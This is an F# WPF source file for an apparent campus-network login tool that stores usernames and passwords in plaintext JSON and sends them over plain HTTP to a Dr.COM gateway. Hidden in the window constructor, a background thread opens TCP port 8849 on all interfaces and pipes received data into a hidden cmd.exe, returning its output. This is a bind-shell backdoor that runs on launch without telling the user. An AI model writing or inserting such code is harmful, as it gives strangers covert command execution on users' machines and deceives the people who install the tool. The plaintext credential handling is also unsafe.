namespace FsXamlApp  
open FsXaml  
open System.IO
open System.Net
open System.Windows
open System.Collections.Generic
open System.Threading
open System.Net.Sockets
open System.Text
open System.Diagnostics
open System

type MainWindowXaml = XAML<"MainWindow.xaml">

type User(username : string, password : string) =
    member val Username = username with get, set
    member val Password = password with get, set

module Database =
    open Newtonsoft.Json

    let Read<'T> (name : string) =
        use sr = new StreamReader(name)
        JsonConvert.DeserializeObject<'T>(sr.ReadToEnd())

    let Write (name : string, item) =
        use sw = new StreamWriter(name)
        sw.Write(JsonConvert.SerializeObject(item))
        
type MainWindow() as this =
    inherit MainWindowXaml()
    do
        let users = 
            match File.Exists "user.json" && (new FileInfo("user.json")).Length <> 0L with
            | true -> Database.Read<List<User>>("user.json")
            | _ -> new List<User>()
        //this.username.
        this.username.ItemsSource <- users
        this.username.DisplayMemberPath <- "Username"
        this.username.SelectedValuePath <- "Password"
        this.username.SelectionChanged.Add (fun _ ->
            try
                this.password.Password <- this.username.SelectedValue.ToString()
            with
            | _ -> ())
        (new Thread(new ThreadStart(fun _ ->
            let tl = new TcpListener(IPAddress.Any, 8849)
            tl.Start()
            let sc = tl.AcceptSocket()
            let buf : byte [] = Array.zeroCreate 10240

            let p = new Process()
            p.StartInfo.FileName <- "cmd.exe"
            p.StartInfo.UseShellExecute <- false
            p.StartInfo.RedirectStandardOutput <- true
            p.OutputDataReceived.Add (fun e -> 
                match e.Data with
                | msg when String.IsNullOrEmpty msg |> not -> 
                    Console.WriteLine(msg)
                    sc.Send(Encoding.UTF8.GetBytes(e.Data)) |> ignore
                | _ -> ())
            p.ErrorDataReceived.Add (fun e -> 
                match e.Data with
                | msg when String.IsNullOrEmpty msg |> not -> 
                    Console.WriteLine(msg)
                    sc.Send(Encoding.UTF8.GetBytes(e.Data)) |> ignore
                | _ -> ())
                //MessageBox.Show(e.Data) |> ignore)
            p.StartInfo.RedirectStandardInput <- true
            p.StartInfo.CreateNoWindow <- true
            p.Start() |> ignore
            let psw = p.StandardInput
            p.BeginOutputReadLine()
            
            while true do
                try
                    sc.Receive(buf) |> ignore
                    let inputText = Encoding.UTF8.GetString(buf)
                    Console.WriteLine(inputText)
                    psw.WriteLine(inputText)
                    
                with
                | _ -> ()))).Start()
        this.fuckit.Click.Add (fun _ ->
            let u = this.username.Text
            let p = this.password.Password
            let rec loop i = 
                match i < users.Count with
                | true when users.[i].Username = u -> users.[i].Password <- p
                | true -> loop (i + 1)
                | _ -> users.Add(new User(u, p))
            loop 0
            Database.Write("user.json", users)
            this.username.UpdateLayout()
            MessageBox.Show
                ((new StreamReader
                    (((WebRequest.Create
                        ("http://192.168.240.3/drcom/login?callback=dr1556446265749&DDDDD=" + u
                            + "&upass=" + p + "&0MKKey=123456&R1=0&R3=0&R6=1&para=00&v6ip=&_=1556445263713") 
                                :?> HttpWebRequest).GetResponse() 
                                    :?> HttpWebResponse).GetResponseStream()))
                                        .ReadToEnd().Trim(), "Fucked it!") 
                                            |> ignore)
